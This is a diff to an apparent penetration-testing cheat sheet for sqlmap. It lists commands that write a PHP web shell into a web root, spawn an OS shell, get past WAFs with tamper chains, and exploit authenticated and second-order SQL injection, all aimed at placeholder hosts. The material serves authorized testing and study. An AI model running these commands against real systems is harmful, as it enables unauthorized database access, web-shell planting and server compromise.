@@ -26,3 +26,17 @@
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
 | sqlmap -u "ws//example.com/websocket " --data='{"param":"*"}'                                                             |                                                             |
+
+## New Tricks
+
+### Trick 1
+- Scenario: Confirmed POST JSON SQLi with authenticated cookie context.
+- Payload: `sqlmap -r req.txt --batch --level=5 --risk=3`
+
+### Trick 2
+- Scenario: Bypassed WAF using tamper chain on boolean-based endpoint.
+- Payload: `sqlmap -u https://tld/item?id=1 --tamper=space2comment,between --dbs`
+
+### Trick 3
+- Scenario: Second-order SQLi exploited stored payload in report generator.
+- Payload: `sqlmap -r create.txt --second-url=https://tld/admin/reports --batch`
